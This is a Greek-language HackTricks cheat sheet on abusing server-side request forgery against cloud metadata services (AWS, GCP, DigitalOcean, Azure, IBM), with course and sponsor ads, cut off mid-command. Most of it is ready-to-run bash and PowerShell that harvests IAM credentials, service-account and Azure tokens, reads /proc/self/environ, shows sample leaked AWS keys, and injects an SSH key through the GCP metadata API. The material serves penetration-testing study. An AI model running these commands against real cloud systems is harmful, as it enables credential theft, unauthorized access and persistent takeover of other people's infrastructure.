# Cloud SSRF

<details>

<summary><strong>Μάθετε την κακόβουλη εισβολή στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα κόλπα σας στο χάκινγκ υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που έχουν μεγαλύτερη σημασία ώστε να μπορέσετε να τις διορθώσετε γρηγορότερα. Το Intruder παρακολουθεί την επιφάνεια επίθεσής σας, εκτελεί προληπτικές απειλητικές σάρωσεις, εντοπίζει προβλήματα σε ολόκληρη την τεχνική σας στοίβα, από APIs έως web εφαρμογές και συστήματα cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## AWS

### Κατάχρηση του SSRF στο περιβάλλον AWS EC2

**Το metadata** σημείο πρόσβασης μπορεί να προσπελαστεί από οποιαδήποτε μηχάνημα EC2 και προσφέρει ενδιαφέρουσες πληροφορίες για αυτό. Είναι προσβάσιμο στο url: `http://169.254.169.254` ([πληροφορίες σχετικά με τα metadata εδώ](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)).

Υπάρχουν **2 εκδόσεις** του σημείου πρόσβασης στα metadata. Η **πρώτη** επιτρέπει την **πρόσβαση** στο σημείο πρόσβασης μέσω αιτήσεων **GET** (έτσι μια **SSRF μπορεί να το εκμεταλλευτεί**). Για τη **δεύτερη έκδοση**, [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), πρέπει να ζητήσετε ένα **διακριτικό** στέλνοντας μια αίτηση **PUT** με ένα **HTTP header** και στη συνέχεια να χρησιμοποιήσετε αυτό το διακριτικό για να αποκτήσετε πρόσβαση στα metadata με ένα άλλο HTTP header (έτσι είναι **πιο περίπλοκο να εκμεταλλευτείτε** με μια SSRF).

{% hint style="danger" %}
Σημειώστε ότι αν η μηχανή EC2 επιβάλλει το IMDSv2, [**σύμφωνα με τα έγγραφα**](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html), η **απάντηση της αίτησης PUT** θα έχει ένα **όριο hop του 1**, κάνοντας αδύνατη την πρόσβαση στα metadata της EC2 από ένα container μέσα στη μηχανή EC2.

Επιπλέον, το **IMDSv2** θα **αποκλείσει επίσης τις αιτήσεις για τη λήψη ενός διακριτικού που περιλαμβάνουν το `X-Forwarded-For` header**. Αυτό γίνεται για να αποτρέψει τις λανθασμένα διαμορφωμένες αντίστροφες διακριτικές από το να μπορούν να το αποκτήσουν.
{% endhint %}

Μπορείτε να βρείτε πληροφορίες σχετικά με τα [σημεία πρόσβασης στα metadata στα έγγραφα](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html). Στο παρακάτω σενάριο αποκτώνται κάποιες ενδιαφέρουσες πληροφορίες από αυτό:
```bash
EC2_TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
HEADER="X-aws-ec2-metadata-token: $EC2_TOKEN"
URL="http://169.254.169.254/latest/meta-data"

aws_req=""
if [ "$(command -v curl)" ]; then
aws_req="curl -s -f -H '$HEADER'"
elif [ "$(command -v wget)" ]; then
aws_req="wget -q -O - -H '$HEADER'"
else
echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
fi

printf "ami-id: "; eval $aws_req "$URL/ami-id"; echo ""
printf "instance-action: "; eval $aws_req "$URL/instance-action"; echo ""
printf "instance-id: "; eval $aws_req "$URL/instance-id"; echo ""
printf "instance-life-cycle: "; eval $aws_req "$URL/instance-life-cycle"; echo ""
printf "instance-type: "; eval $aws_req "$URL/instance-type"; echo ""
printf "region: "; eval $aws_req "$URL/placement/region"; echo ""

echo ""
echo "Account Info"
eval $aws_req "$URL/identity-credentials/ec2/info"; echo ""
eval $aws_req "http://169.254.169.254/latest/dynamic/instance-identity/document"; echo ""

echo ""
echo "Network Info"
for mac in $(eval $aws_req "$URL/network/interfaces/macs/" 2>/dev/null); do
echo "Mac: $mac"
printf "Owner ID: "; eval $aws_req "$URL/network/interfaces/macs/$mac/owner-id"; echo ""
printf "Public Hostname: "; eval $aws_req "$URL/network/interfaces/macs/$mac/public-hostname"; echo ""
printf "Security Groups: "; eval $aws_req "$URL/network/interfaces/macs/$mac/security-groups"; echo ""
echo "Private IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv4-associations/"; echo ""
printf "Subnet IPv4: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv4-cidr-block"; echo ""
echo "PrivateIPv6s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv6s"; echo ""
printf "Subnet IPv6: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv6-cidr-blocks"; echo ""
echo "Public IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/public-ipv4s"; echo ""
echo ""
done

echo ""
echo "IAM Role"
eval $aws_req "$URL/iam/info"
for role in $(eval $aws_req "$URL/iam/security-credentials/" 2>/dev/null); do
echo "Role: $role"
eval $aws_req "$URL/iam/security-credentials/$role"; echo ""
echo ""
done

echo ""
echo "User Data"
# Search hardcoded credentials
eval $aws_req "http://169.254.169.254/latest/user-data"

echo ""
echo "EC2 Security Credentials"
eval $aws_req "$URL/identity-credentials/ec2/security-credentials/ec2-instance"; echo ""
```
Ως ένα παράδειγμα εκθεσιμών **δημόσιων IAM διαπιστεύσεων**, μπορείτε να επισκεφθείτε: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws)

Μπορείτε επίσης να ελέγξετε δημόσιες **διαπιστεύσεις ασφαλείας EC2** στο: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance)

Στη συνέχεια, μπορείτε να **χρησιμοποιήσετε αυτές τις διαπιστεύσεις με το AWS CLI**. Αυτό θα σας επιτρέψει να κάνετε **οτιδήποτε έχει άδεια ο ρόλος** να κάνει.

Για να επωφεληθείτε από τις νέες διαπιστεύσεις, θα πρέπει να δημιουργήσετε ένα νέο προφίλ AWS όπως το παρακάτω:
```
[profilename]
aws_access_key_id = ASIA6GG7PSQG4TCGYYOU
aws_secret_access_key = a5kssI2I4H/atUZOwBr5Vpggd9CxiT5pUkyPJsjC
aws_session_token = AgoJb3JpZ2luX2VjEGcaCXVzLXdlc3QtMiJHMEUCIHgCnKJl8fwc+0iaa6n4FsgtWaIikf5mSSoMIWsUGMb1AiEAlOiY0zQ31XapsIjJwgEXhBIW3u/XOfZJTrvdNe4rbFwq2gMIYBAAGgw5NzU0MjYyNjIwMjkiDCvj4qbZSIiiBUtrIiq3A8IfXmTcebRDxJ9BGjNwLbOYDlbQYXBIegzliUez3P/fQxD3qDr+SNFg9w6WkgmDZtjei6YzOc/a9TWgIzCPQAWkn6BlXufS+zm4aVtcgvBKyu4F432AuT4Wuq7zrRc+42m3Z9InIM0BuJtzLkzzbBPfZAz81eSXumPdid6G/4v+o/VxI3OrayZVT2+fB34cKujEOnBwgEd6xUGUcFWb52+jlIbs8RzVIK/xHVoZvYpY6KlmLOakx/mOyz1tb0Z204NZPJ7rj9mHk+cX/G0BnYGIf8ZA2pyBdQyVbb1EzV0U+IPlI+nkIgYCrwTCXUOYbm66lj90frIYG0x2qI7HtaKKbRM5pcGkiYkUAUvA3LpUW6LVn365h0uIbYbVJqSAtjxUN9o0hbQD/W9Y6ZM0WoLSQhYt4jzZiWi00owZJjKHbBaQV6RFwn5mCD+OybS8Y1dn2lqqJgY2U78sONvhfewiohPNouW9IQ7nPln3G/dkucQARa/eM/AC1zxLu5nt7QY8R2x9FzmKYGLh6sBoNO1HXGzSQlDdQE17clcP+hrP/m49MW3nq/A7WHIczuzpn4zv3KICLPIw2uSc7QU6tAEln14bV0oHtHxqC6LBnfhx8yaD9C71j8XbDrfXOEwdOy2hdK0M/AJ3CVe/mtxf96Z6UpqVLPrsLrb1TYTEWCH7yleN0i9koRQDRnjntvRuLmH2ERWLtJFgRU2MWqDNCf2QHWn+j9tYNKQVVwHs3i8paEPyB45MLdFKJg6Ir+Xzl2ojb6qLGirjw8gPufeCM19VbpeLPliYeKsrkrnXWO0o9aImv8cvIzQ8aS1ihqOtkedkAsw=
```
Σημειώστε το **aws\_session\_token**, αυτό είναι απαραίτητο για το προφίλ να λειτουργεί.

[**PACU**](https://github.com/RhinoSecurityLabs/pacu) μπορεί να χρησιμοποιηθεί με τα ανακαλυμένα διαπιστευτήρια για να μάθετε τα προνόμιά σας και να προσπαθήσετε να αναβαθμίσετε τα προνόμια

### SSRF στα διαπιστευτήρια του AWS ECS (Υπηρεσία Ελέγχου Εμπορευμάτων)

**ECS**, είναι μια λογική ομάδα EC2 παραδειγμάτων στα οποία μπορείτε να εκτελέσετε μια εφαρμογή χωρίς να χρειάζεται να κλιμακώσετε τη δική σας υποδομή διαχείρισης συστάδων επειδή το ECS τη διαχειρίζεται για εσάς. Εάν καταφέρετε να διακινδυνεύσετε την υπηρεσία που εκτελείται στο **ECS**, οι **μεταδεδομένες κατευθύνσεις αλλάζουν**.

Εάν έχετε πρόσβαση στο _**http://169.254.170.2/v2/credentials/\<GUID>**_ θα βρείτε τα διαπιστευτήρια της μηχανής του ECS. Αλλά πρώτα πρέπει να **βρείτε το \<GUID>**. Για να βρείτε το \<GUID> πρέπει να διαβάσετε τη μεταβλητή **environ** **AWS\_CONTAINER\_CREDENTIALS\_RELATIVE\_URI** μέσα στη μηχανή.\
Μπορείτε να το διαβάσετε εκμεταλλευόμενοι ένα **Path Traversal** στο `file:///proc/self/environ`\
Η αναφερόμενη διεύθυνση http θα σας δώσει τα **AccessKey, SecretKey και token**.
```bash
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || wget "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" -O -
```
{% hint style="info" %}
Σημειώστε ότι σε **κάποιες περιπτώσεις** θα μπορείτε να έχετε πρόσβαση στα **μεταδεδομένα της EC2 instance** από το container (ελέγξτε τους περιορισμούς TTL του IMDSv2 που αναφέρθηκαν προηγουμένως). Σε αυτά τα σενάρια από το container μπορείτε να έχετε πρόσβαση τόσο στον ρόλο IAM του container όσο και στον ρόλο IAM της EC2.
{% endhint %}

### SSRF για το AWS Lambda <a href="#id-6f97" id="id-6f97"></a>

Σε αυτήν την περίπτωση οι **διαπιστευτήρια αποθηκεύονται σε μεταβλητές περιβάλλοντος**. Έτσι, για να έχετε πρόσβαση σε αυτά, χρειάζεται να έχετε πρόσβαση σε κάτι σαν το **`file:///proc/self/environ`**.

Τα **ονόματα** των **ενδιαφέρουσων μεταβλητών περιβάλλοντος** είναι:

* `AWS_SESSION_TOKEN`
* `AWS_SECRET_ACCESS_KEY`
* `AWS_ACCES_KEY_ID`

Επιπλέον, εκτός από τα διαπιστευτήρια IAM, οι λειτουργίες Lambda έχουν επίσης **δεδομένα συμβάντων που περνούν στη λειτουργία όταν ξεκινά**. Αυτά τα δεδομένα είναι διαθέσιμα στη λειτουργία μέσω της [διεπαφής εκτέλεσης](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html) και μπορεί να περιέχει **ευαίσθητες πληροφορίες** (όπως μέσα στις **stageVariables**). Αντίθετα με τα διαπιστευτήρια IAM, αυτά τα δεδομένα είναι προσβάσιμα μέσω του τυπικού SSRF στο **`http://localhost:9001/2018-06-01/runtime/invocation/next`**.

{% hint style="warning" %}
Σημειώστε ότι τα **διαπιστευτήρια lambda** βρίσκονται μέσα στις **μεταβλητές περιβάλλοντος**. Έτσι, αν το **stack trace** του κώδικα lambda εκτυπώνει μεταβλητές περιβάλλοντος, είναι δυνατόν να τις **εξαγάγετε προκαλώντας ένα σφάλμα** στην εφαρμογή.
{% endhint %}

### SSRF URL για το AWS Elastic Beanstalk <a href="#id-6f97" id="id-6f97"></a>

Ανακτούμε το `accountId` και την `region` από το API.
```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
Στη συνέχεια ανακτούμε τα `AccessKeyId`, `SecretAccessKey`, και `Token` από το API.
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
![](https://miro.medium.com/max/60/0\*4OG-tRUNhpBK96cL?q=20) ![](https://miro.medium.com/max/1469/0\*4OG-tRUNhpBK96cL)

Στη συνέχεια χρησιμοποιούμε τα διαπιστευτήρια με `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.

## GCP <a href="#id-6440" id="id-6440"></a>

Μπορείτε να [**βρείτε εδώ τα έγγραφα σχετικά με τα σημεία πρόσβασης μεταδεδομένων**](https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata).

### SSRF URL για το Google Cloud <a href="#id-6440" id="id-6440"></a>

Απαιτεί την κεφαλίδα HTTP **`Metadata-Flavor: Google`** και μπορείτε να έχετε πρόσβαση στο σημείο μεταδεδομένων με τις παρακάτω διευθύνσεις URL:

* http://169.254.169.254
* http://metadata.google.internal
* http://metadata

Ενδιαφέροντα σημεία πρόσβασης για εξαγωγή πληροφοριών:
```bash
# /project
# Project name and number
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
# Project attributes
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/attributes/?recursive=true

# /oslogin
# users
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
# groups
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
# security-keys
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
# authorize
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize

# /instance
# Description
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
# Hostname
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
# ID
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Image
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
# Machine Type
curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
# Name
curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
# Tags
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# User data
curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
# Network Interfaces
for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do
echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
echo "  ==============  "
done
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
echo "  Name: $sa"
echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
echo "  ==============  "
done
# K8s Attributtes
## Cluster location
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
## Cluster name
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
## Os-login enabled
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
## Kube-env
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
## Kube-labels
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
## Kubeconfig
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig

# All custom project attributes
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
-H "Metadata-Flavor: Google"

# All custom project attributes instance attributes
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
-H "Metadata-Flavor: Google"
```
Το Beta ΔΕΝ απαιτεί κεφαλίδα αυτήν τη στιγμή (ευχαριστίες στον Mathias Karlsson @avlidienbrunn)
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```
{% hint style="danger" %}
Για να **χρησιμοποιήσετε το διαρρεύσαν τοκεν λογαριασμού υπηρεσίας** απλά μπορείτε να κάνετε:
```bash
# Via env vars
export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
gcloud projects list

# Via setup
echo "<token>" > /some/path/to/token
gcloud config set auth/access_token_file /some/path/to/token
gcloud projects list
gcloud config unset auth/access_token_file
```
{% endhint %}

### Προσθήκη ενός κλειδιού SSH <a href="#id-3e24" id="id-3e24"></a>

Εξαγωγή του τοκέν
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```
Ελέγξτε το εύρος του τοκεν (με την προηγούμενη έξοδο ή εκτελώντας το ακόλουθο)
```bash
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  {
"issued_to": "101302079XXXXX",
"audience": "10130207XXXXX",
"scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
"expires_in": 2443,
"access_type": "offline"
}
```
Τώρα πατήστε το κλειδί SSH. 

{% code overflow="wrap" %}
```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"
-H "Content-Type: application/json"
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```
{% endcode %}

### Cloud Functions <a href="#id-9f1f" id="id-9f1f"></a>

Το σημείο μεταδεδομένων λειτουργεί με τον ίδιο τρόπο όπως στις VMs αλλά χωρίς μερικά σημεία πρόσβασης:
```bash
# /project
# Project name and number
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id

# /instance
# ID
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# Auto MTLS config
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/platform-security/auto-mtls-configuration
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
echo "  Name: $sa"
echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
echo "  ==============  "
done
```
## Digital Ocean <a href="#id-9f1f" id="id-9f1f"></a>

{% hint style="warning" %}
Δεν υπάρχουν πράγματα όπως Ρόλοι AWS ή λογαριασμός υπηρεσίας GCP, οπότε μην αναμένετε να βρείτε μεταδεδομένα bot διαπιστευτήρια
{% endhint %}

Τεκμηρίωση διαθέσιμη στο [`https://developers.digitalocean.com/documentation/metadata/`](https://developers.digitalocean.com/documentation/metadata/)
```
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/addressAll in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```
<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που έχουν μεγαλύτερη σημασία ώστε να μπορέσετε να τις διορθώσετε γρηγορότερα. Το Intruder καταγράφει την επιφάνεια επίθεσής σας, εκτελεί προληπτικές απειλητικές σάρωσεις, εντοπίζει προβλήματα σε ολόκληρη την τεχνική σας στοίβα, από APIs έως web εφαρμογές και συστήματα στο cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm_source=referral\&utm_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Azure <a href="#cea8" id="cea8"></a>

### Azure VM

[**Εγγραφές** εδώ](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=linux).

* **Πρέπει** να περιέχει την κεφαλίδα `Metadata: true`
* Δεν πρέπει να περιέχει την κεφαλίδα `X-Forwarded-For`

{% tabs %}
{% tab title="Bash" %}
{% code overflow="wrap" %}
```bash
HEADER="Metadata:true"
URL="http://169.254.169.254/metadata"
API_VERSION="2021-12-13" #https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions

echo "Instance details"
curl -s -f -H "$HEADER" "$URL/instance?api-version=$API_VERSION"

echo "Load Balancer details"
curl -s -f -H "$HEADER" "$URL/loadbalancer?api-version=$API_VERSION"

echo "Management Token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"

echo "Graph token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/"

echo "Vault token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"

echo "Storage token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://storage.azure.com/"
```
{% endcode %}
{% endtab %}

{% tab title="PS" %}
```bash
# Powershell
Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -NoProxy -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64
## User data
$userData = Invoke- RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021- 01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

# Paths
/metadata/instance?api-version=2017-04-02
/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
/metadata/instance/compute/userData?api-version=2021-01-01&format=text
```
### Υπηρεσία Εφαρμογής Azure

Από το **env** μπορείτε να λάβετε τις τιμές του `IDENTITY_HEADER` _και_ `IDENTITY_ENDPOINT`. Αυτά μπορείτε να χρησιμοποιήσετε για να συγκεντρώσετε ένα τοκέν για να επικοινωνήσετε με τον διακομιστή μεταδεδομένων.

Συνήθως, θέλετε ένα τοκέν για έναν από αυτούς τους πόρους:

* [https://storage.azure.com](https://storage.azure.com/)
* [https://vault.azure.net](https://vault.azure.net/)
* [https://graph.microsoft.com](https://graph.microsoft.com/)
* [https://management.azure.com](https://management.azure.com/)
```bash
# Check for those env vars to know if you are in an Azure app
echo $IDENTITY_HEADER
echo $IDENTITY_ENDPOINT

# You should also be able to find the folder:
ls /opt/microsoft
#and the file
ls /opt/microsoft/msodbcsql17

# Get management token
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
# Get graph token
curl "$IDENTITY_ENDPOINT?resource=https://graph.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# API
# Get Subscriptions
URL="https://management.azure.com/subscriptions?api-version=2020-01-01"
curl -H "Authorization: $TOKEN" "$URL"
# Get current permission on resources in the subscription
URL="https://management.azure.com/subscriptions/<subscription-uid>/resources?api-version=2020-10-01'"
curl -H "Authorization: $TOKEN" "$URL"
# Get permissions in a VM
URL="https://management.azure.com/subscriptions/<subscription-uid>/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/<VM-name>/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"
curl -H "Authorization: $TOKEN" "$URL"
```

```powershell
# API request in powershell to management endpoint
$Token = 'eyJ0eX..'
$URI='https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# API request to graph endpoint (get enterprise applications)
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# Using AzureAD Powershell module witho both management and graph tokens
$token = 'eyJ0e..'
$graphaccesstoken = 'eyJ0eX..'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 2e91a4f12984-46ee-2736-e32ff2039abc

# Try to get current perms over resources
Get-AzResource
## The following error means that the user doesn't have permissions over any resource
Get-AzResource : 'this.Client.SubscriptionId' cannot be null.
At line:1 char:1
+ Get-AzResource
+ ~~~~~~~~~~~~~~
+ CategoryInfo : CloseError: (:) [Get-AzResource],ValidationException
+ FullyQualifiedErrorId :
Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet
```
## IBM Cloud <a href="#id-2af0" id="id-2af0"></a>

{% hint style="warning" %}
Σημειώστε ότι στην IBM από προεπιλογή τα μεταδεδομένα δεν είναι ενεργοποιημένα, οπότε είναι πιθανόν να μην μπορείτε να έχετε πρόσβαση σε αυτά ακόμα και αν βρίσκεστε μέσα σε ένα IBM cloud VM
{% endhint %}

{% code overflow="wrap" %}
```bash
export instance_identity_token=`curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01"\
-H "Metadata-Flavor: ibm"\
-H "Accept: application/json"\
-d '{
